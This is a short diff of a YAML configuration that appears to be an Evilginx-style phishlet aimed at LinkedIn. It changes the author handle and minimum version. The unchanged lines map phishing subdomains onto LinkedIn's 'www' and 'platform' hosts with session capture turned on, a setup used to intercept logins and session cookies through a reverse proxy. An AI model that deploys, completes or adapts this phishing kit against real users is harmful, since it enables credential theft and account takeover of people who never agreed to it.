@@ -1,5 +1,5 @@
-author: '@an0nud4y'
-min_ver: '2.3.0'
+author: '@fatiu'
+min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
   - {phish_sub: 'platform', orig_sub: 'platform', domain: 'linkedin.com', session: true, is_landing: false}
